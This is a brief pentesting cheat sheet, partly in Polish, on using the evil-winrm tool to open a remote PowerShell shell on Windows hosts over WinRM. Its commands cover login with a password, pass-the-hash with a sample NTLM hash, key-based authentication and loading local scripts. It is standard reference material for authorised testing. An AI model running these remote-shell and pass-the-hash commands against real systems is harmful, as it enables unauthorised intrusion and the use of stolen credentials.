# Windows Remote Management shell for pentesting.
Wykorzystuje WinRM do utworzenia shella

```powershell
evil-winrm -i <target-ip> -u username -p password

# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password

# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
```
If you have private key and public key, you can use them for authentication.

```sh
# -S: SSL
# -k: private key
# -c: public key
evil-winrm -i <target-ip> -S -k private.key -c public.key
```

https://exploit-notes.hdks.org/exploit/windows/protocol/winrm-pentesting/

|                 |                                         |
| --------------- | --------------------------------------- |
| `-i <IP>`       | IP hosta                                |
| `-P <port>`     | port (można pominąć, wybierze domyślny) |
| `-u ... -p ...` | login i hasło użytkownika               |

# Pass-the-hash
```bash
# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc
```